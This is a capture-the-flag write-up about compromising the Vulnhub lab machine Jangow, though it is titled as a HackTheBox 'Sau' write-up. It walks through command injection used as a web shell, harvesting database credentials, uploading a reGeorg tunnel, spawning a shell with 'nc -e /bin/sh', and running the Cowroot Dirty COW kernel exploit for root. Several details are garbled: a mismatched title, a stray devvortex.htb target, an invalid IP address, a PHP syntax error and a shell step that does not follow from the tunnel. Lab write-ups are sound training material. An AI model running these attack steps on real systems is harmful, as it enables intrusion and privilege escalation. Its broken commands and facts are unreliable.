---
title: Sau Writeup - HackTheBox
date: 2023-12-29
categories:
  - Writeups
  - HTB
tags:
  - Linux
  - CTF
  - Easy
  - "#Vulnhub"
img_path: /assets/img/commons/jangow/
image: jangow.png
---

Hello!

In this write-up, we will dive into the **Vulnhub** [**Jangow**](https://www.vulnhub.com/entry/jangow-101,754/) machine.
It is a **Linux** machine on which we will carry out an exhaustive **enumeration**. We will take advantage of a **web shell** provided by the victim. We will find **FTP** credentials and we will make use of this to create a Proxy Sock tunnel connection in order to get a **reverse shell**.

As always, we will end with a **privilege scalation**, this time taking advantage of the **race conditions** of the Linux kernel (version *4.4.0-31-generic*)


Let's go!

## Setting up the environment
---
Download the .ova file from the vulnhub page. Open it with VirtualBox or VmWare.

> Make sure to connect the machine to NAT

## Active recognition
---

As a first step, let's see what IP is assigned to the machine using the **arp-scan** tool:

```bash
> sudo arp-scan --interface=eth0 --localnet
Interface: eth0, type: EN10MB, MAC: xx:xx:xx:xx:xx:xx, IPv4: 192.x.0.x
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.x.0.x	xx:xx:xx:xx:xx:xx	(Unknown)
192.x.0.x	xx:xx:xx:xx:xx:xx	(Unknown)
192.x.0.x	xx:xx:xx:xx:xx:xx	(Unknown)
10.0.2.4    xx:xx:xx:xx:xx:xx   Ubuntu Server
```

We see that the victim machine has the IP address `10.0.2.4`

Let's take a look to the machine status:

```bash
> ping -c 1 10.0.2.4
PING 10.0.2.4 (10.0.2.4) 56(84) bytes of data.
64 bytes from 10.0.2.4: icmp_seq=1 ttl=64 time=0.020 ms

--- 10.0.2.4 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.020/0.020/0.020/0.000 ms
```

## Port scaning
---

Next, we run a scan with `nmap` to identify open ports on the target machine.

```bash
> nmap -sC -sV 10.0.2.4
Nmap scan report for 10.0.2.4
Host is up (0.00090s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT      STATE    SERVICE VERSION
21/tcp    open     ftp     vsftpd 3.0.3
80/tcp    open     http    Apache httpd 2.4.18
|-http-title: Index of /
| http-ls: Volume /
| SIZE    TIME                FILENAME
| -       2021-06-10 18:05    site/
|_
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: Host: 127.0.0.1; OS: Unix

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.06 seconds
```

After the port enumeration, we can see that ports 21 (ftp) and 80 (http) are open. We try to access `10.0.2.4` in the browser:

![home](home.png)

We access the `/site` directory:

![website](site.png)

## Information gathering
---
In principle, we don't see anything interesting except the search section. When we access this section, we see the following url: `http://10.0.2.4/site/busque.php?buscar=`.  We can try to execute some bash command:

![webshell](url-shell.png)

We look for a directory or a file that may be useful to us:

```bash
gobuster dir -u http://devvortex.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -r
```

We find the directory `/wordpress`, inside we find the files: `config.php` and `index.html`. Let's see what's inside the file `config.php`:

```bash
wget 10.0.2.4/site/busque.php?buscar=cat%20wordpress/config.php
```

We open the file using the **cat** tool:
```php
<?php
$servername = "localhost";
$database = "desafio02";
$username = "desafio02";
$password = "abygurl69";
// Create connection
$conn = mysqli_connect($servername, $username, $password,$database);
// Check connection
if (!$conn) {
	die("Connection failed: ", mysqli_connect_error()):
}
echo "Connected succesfully";
mysqli_close($conn);
?>
```

We see some user credentials and a connection to SQL. Let's search for more open ports using the webshell: `view-source:http://10.0.2.4/site/busque.php?buscar=netsat -antopu | grep LISTEN`

![new ports found](sql_port.png)

We find the ports 3306 (SQL) and 22 (SSH). It is a *rabbit hole*. Nothing to do here.

If we execute `ls /home` using the web shell, we see that the user credentials we have obtained are useless, so let's look for more directories and files using the **wfuzz** tool:
```bash
> wfuzz -w /usr/share/wordlists/wfuzz/general/medium.txt --hc 404,403 http://10.0.0.2.4/.FUZZ
***********************************************
* Wfuzz 3.1.0 - The Web Fuzzer                *
***********************************************

Target: http://10.0.2.4/.FUZZ
Total requests: 1659

==================================================================
ID           Response    Lines    Word      Chars     Payload
==================================================================
000000152:   200         12 L     37 W      336 Ch    "backup"

Total time: 1.265443
Processed Requests: 1659
Filtered Requests: 1658
Requests/sec.: 1311.002
```

We found a `.backup` file. Let's see what contains:
```php
<?php
$servername = "localhost";
$database = "jangow01";
$username = "jangow01";
$password = "abygurl69";
// Create connection
$conn = mysqli_connect($servername, $username, $password,$database);
// Check connection
if (!$conn) {
	die("Connection failed: ", mysqli_connect_error()):
}
echo "Connected succesfully";
mysqli_close($conn);
?>
```

Bingo!  We already have the user credentials.

### Accessing via FTP
SSH is restricted so we can't access through there. We cannot continue with the web shell either because the user running it (`www-data`) doesn't have sufficient permissions.

With the credentials that we have just obtained we are going to access the FTP server and we are going to take advantage of this access to create a proxy sock that will provide us a tunnel connection between our machine and the victim.

### Creating a Proxy Sock using the reGeorg tool
This tool provides us with different php scripts that create a connection between the attacking machine and the victim using sockets.

Using tools like **Filezilla**, we upload our reGeorg file `tunnel.nosocket.php` to the `/tmp` folder of the victim machine.

Once the file is on the victim machine, we rename it to `tunnel.php` (to make it more comfortable to work with) and give it permissions (recommended: 777)

For more security, we can check that the file is on the victim machine by running `ls /tmp`.

Using the web shell, we execute:

```bash
cp -v /tmp/tunnel.php /var/www/html/site/tunnel.php
```

In a new terminal, we execute:
```bash
export SOCKS_PROXY=socks5://127.0.0.1:8080
python reGeorgSocksProxy.py -p 8080 -u 10.0.2.4/site/tunnel.php
```

If we execute now in another terminal the command:
```bash
nc -e /bin/sh 10.0.2.4 80
```

We should get a shell with access to the system.

### Obtaining the user flag
Once we are in, we can get the user flag:

```bash
cd /home/jangow01
ls
cat user.txt
```

## Privilege escalation
---
Now that we have user access to the system, let's look at how we can escalate privileges.

We start by looking for which Linux kernel version is the system running. We execute the command:

```bash
uname -a
```

After running it, we can see that the Linux Kernel version running is 4.4.0-31-generic which is vulnerable to the vulnerability **CVE-2016-5195** (this vulnerability affects memory race conditions, it allows us to escalate privileges locally using the *copy-on -write* feature that allows us to write memory addresses that should be read-only).

Searching the internet we found the exploit Cowroot. We download it using **wget**. Once we have it, we access the FTP server again and run:

```bash
cd /hom/jangow01
put cowroot.c
```

Exit the FTP.

In the shell that we already have (as the user *jangow01*), we follow the exploit instructions:

```bash
# Access the user directory
cd /home/jangow01

# Compile the exploit
gcc cowroot.c -o cowroot -pthread

# Execute the exploit
./cowroot
```

Finally (if everything has worked correctly), we have access as superuser, we have the whole system committed and (of course) we can now obtain the root flag of the machine.

> H4Ppy H4ck1ng!
